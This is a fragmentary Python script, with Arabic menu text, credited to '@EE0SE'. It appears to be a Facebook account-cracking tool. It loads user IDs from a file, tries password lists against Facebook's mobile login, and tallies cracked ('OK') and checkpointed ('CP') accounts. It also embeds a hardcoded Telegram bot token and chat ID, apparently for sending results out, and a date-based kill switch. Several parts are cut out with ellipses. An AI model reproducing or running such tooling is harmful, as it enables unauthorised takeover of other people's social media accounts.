import datetime
now=datetime.date.today();target=datetime.date(2024 , 3 , 6)
if now >=target:exit(' راسل المطور لتفعيل @EE0SE وقفت')
else:pass
...
#-------------------#
os.system('clear')
print(F+'FACE'+Y+'𝙱𝙾𝙾𝙺 '+E+'os'+B+'ama'+Z)
print(E+'♥'*40)
print(F+'➨ '+Y+'BY '+E+''+B+'| @EE0SE'+Z)
print(F+'➨ '+Y+'BY '+E+''+B+'| @EE0SE'+Z)
print(G+'♥'*40)
print('\n')
...
ID=input(Y+'ID»»♪: '+R)
print('\n')
token=('6466932710:AAHnWgfLZ1GXSdHGRGukxKOQhTNuy0kzP44')
print('\033[2;35m')
print(' ━━━━━━━━━━━━━━━━━━━━━ ')
print('\n')
ID=('6600581148')
...
\033[2;35m❆\033[1;33m═══════════════\033[2;32m[𓆩اسامه]\033[1;33m════════════════\033[2;35m❆
 \033[1;33m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[2;35m┓    
 \033[2;35m┃ \033[2;32mTelegram : \x1b[38;5;209m ☆𝑆𝐷𝑀☆ اسامه | @EE0SE \033[2;35m┃
 \033[1;33m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[2;35m┛                                                 
...
def menu():
	...
	_IPYTHONI_(f'\x1b[1;98m[ 1 ] من ملف')
	
	_IPYTHONI_(f'\x1b[1;98m [ 2 ] من ايديات[معطل]')
	_____IPYTHONI_____ = input('\x1b[1;96mاختر :\x1b[1;97m ')
	if _____IPYTHONI_____ in ['1']:
		F()
		print(' \x1b[1;91m\x1b[1;96m\x1b[1;97m LogOut Successful ')
		exit()
	else:
		print(' \x1b[1;91m\x1b[1;96m\x1b[1;91m NOT اختر')
		back()
def error():
...
#SERVER-SETTING			
def Settings():
	print(f'\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91m[\x1b[1;97m1\x1b[1;91m]\x1b[1;97mجديده \x1b[1;91m[FASTER]\n\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91m[\x1b[1;97m2\x1b[1;91m]\x1b[1;97mقديمه وا جديده\x1b[1;93m [BEST]')
	hu = input('\x1b[1;96mاختر : \x1b[1;97m')
	if hu in ['1','01']:
		muda=[]
		...
		print('\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91mNOT اختر')
		exit()
	
	print(f'\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91m[\x1b[1;97m1\x1b[1;91m]\x1b[1;97mMOBILE\x1b[1;95m [BESTED]')
	hc = input('\x1b[1;96mاختر :\x1b[1;97m ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	pwplus=input('\x1b[1;97m[ M ] باسورات من يمك \x1b[1;96m [HARD]\n\x1b[1;91m\x1b[1;96m\x1b[1;97m[ A ] باسورات عشوائيه\x1b[1;92m [EASY]\n\x1b[1;96mاختر : \x1b[1;97m')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r (OSAMA) {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
...
def ceker(idf,pw):
	...
	head = {"Host":'authority''www.facebook.com',
